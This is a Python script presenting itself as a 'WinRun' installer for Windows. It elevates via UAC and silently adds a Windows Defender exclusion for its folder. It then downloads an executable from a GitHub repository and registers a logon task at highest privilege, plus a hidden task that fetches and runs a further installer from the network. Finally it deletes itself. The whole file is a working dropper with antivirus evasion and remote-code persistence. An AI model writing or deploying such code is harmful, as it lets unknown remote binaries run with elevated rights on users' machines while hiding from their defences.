import os
import sys
import time
import ctypes
import subprocess
import urllib.request
import json


def is_admin():
    try:
        res = ctypes.windll.shell32.IsUserAnAdmin() != 0
        print(f"[Installer] Admin privilege check: {res}")
        return res
    except Exception as e:
        print(f"[Installer] Admin check failed: {e}")
        return False


def elevate_if_needed():
    dat_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    is_update = os.path.exists(dat_file)
    print(f"[Installer] Checking elevation... is_update={is_update}, is_admin={is_admin()}")

    if not is_update and not is_admin():
        print("[Installer] Clean install & non-admin: requesting UAC elevation...")
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable if getattr(sys, "frozen", False) else sys.executable,
            f'"{script}" {params}' if not getattr(sys, "frozen", False) else params,
            None,
            1,
        )
        sys.exit(0)


def main():
    print("=== [Installer] Starting WinRun Installer ===")
    elevate_if_needed()

    run_dir = os.path.join(os.getenv("APPDATA"), "run")
    run_exe = os.path.join(run_dir, "run.exe")
    dat_dir = os.path.join(os.path.join(os.getenv("APPDATA"), "Microsoft"), "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    temp_dir = os.path.join(os.getenv("TEMP"), "run")

    print(f"[Installer] Paths initialized:")
    print(f"  - run_dir: {run_dir}")
    print(f"  - run_exe: {run_exe}")
    print(f"  - dat_dir: {dat_dir}")

    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(dat_dir, exist_ok=True)
    os.makedirs(temp_dir, exist_ok=True)

    is_update = os.path.exists(dat_file)

    # 1. Defender Exclusion if clean install
    if not is_update:
        print("[Installer] Step 1: Adding Defender exclusion path...")
        res = subprocess.run(
            [
                "powershell.exe",
                "-Command",
                f"Add-MpPreference -ExclusionPath '{run_dir}'",
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        print(f"[Installer] Defender exclusion done (exit code {res.returncode})")
    else:
        print("[Installer] Step 1: Update detected (run.dat exists), skipping Defender exclusion.")

    # 2. Terminate existing run.exe processes
    print("[Installer] Step 2: Terminating any active run.exe processes...")
    res = subprocess.run(
        ["taskkill", "/F", "/IM", "run.exe"], creationflags=subprocess.CREATE_NO_WINDOW
    )
    print(f"[Installer] taskkill finished (exit code {res.returncode})")
    time.sleep(2)

    # 3. Fetch latest commit SHA
    print("[Installer] Step 3: Fetching latest commit SHA from GitHub...")
    latest_commit = "main"
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/yuan-miranda/run/commits/main",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            latest_commit = data.get("sha", "main")
            print(f"[Installer] Latest commit SHA: {latest_commit}")
    except Exception as e:
        print(f"[Installer] Failed to fetch SHA, defaulting to 'main': {e}")

    # 4. Download latest run.exe
    download_url = f"https://github.com/yuan-miranda/run/raw/{latest_commit}/run.exe"
    print(f"[Installer] Step 4: Downloading run.exe from {download_url}...")
    try:
        urllib.request.urlretrieve(download_url, run_exe)
        print(f"[Installer] Successfully downloaded run.exe ({os.path.getsize(run_exe)} bytes)")
    except Exception as e:
        print(f"[Installer] Download failed: {e}")
        sys.exit(1)

    # 5. Register Scheduled Tasks
    task_name = "WinRun"
    installer_task_name = "WinRunInstaller"

    print(f"[Installer] Step 5: Registering Scheduled Task '{task_name}'...")
    ps_task_cmd = (
        f"$action = New-ScheduledTaskAction -Execute '{run_exe}' -WorkingDirectory '{run_dir}'; "
        f"$trigger = New-ScheduledTaskTrigger -AtLogOn; "
        f"$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 365); "
        f"Register-ScheduledTask -TaskName '{task_name}' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force"
    )
    res = subprocess.run(
        ["powershell.exe", "-Command", ps_task_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    print(f"[Installer] Scheduled task '{task_name}' registered (exit code {res.returncode})")

    print(f"[Installer] Step 5b: Registering Scheduled Task '{installer_task_name}'...")
    cmd_installer = (
        '"$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
        "$sha=(Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha; "
        '$o=\\"$p\\installer.exe\\"; Invoke-WebRequest -Uri \\"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\\" -OutFile $o; '
        'Start-Process -FilePath $o -WindowStyle Hidden"'
    )

    ps_installer_task_cmd = (
        f"$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-Command {cmd_installer}'; "
        f"$installerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10) -Hidden; "
        f"Register-ScheduledTask -TaskName '{installer_task_name}' -Action $installerAction -Settings $installerSettings -RunLevel Highest -Force"
    )
    res = subprocess.run(
        ["powershell.exe", "-Command", ps_installer_task_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    print(f"[Installer] Scheduled task '{installer_task_name}' registered (exit code {res.returncode})")

    # Save state
    try:
        with open(dat_file, "w", encoding="utf-8") as f:
            f.write(latest_commit)
        print(f"[Installer] Saved state file run.dat with SHA: {latest_commit}")
    except Exception as e:
        print(f"[Installer] Failed to write run.dat: {e}")

    # 6. Launch run.exe via Task Scheduler
    print(f"[Installer] Step 6: Triggering scheduled task '{task_name}' via schtasks...")
    res = subprocess.run(
        ["schtasks", "/Run", "/TN", task_name],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    print(f"[Installer] schtasks /Run finished (exit code {res.returncode})")

    # 7. Self-delete installer binary after execution
    self_path = os.path.abspath(sys.argv[0])
    print(f"[Installer] Step 7: Initiating self-deletion of {self_path}...")
    if os.path.exists(self_path) and self_path.lower() != run_exe.lower():
        subprocess.Popen(
            f'cmd.exe /c timeout /t 2 >nul & del /f /q "{self_path}"',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

    print("=== [Installer] Installation Completed Successfully ===")


if __name__ == "__main__":
    main()
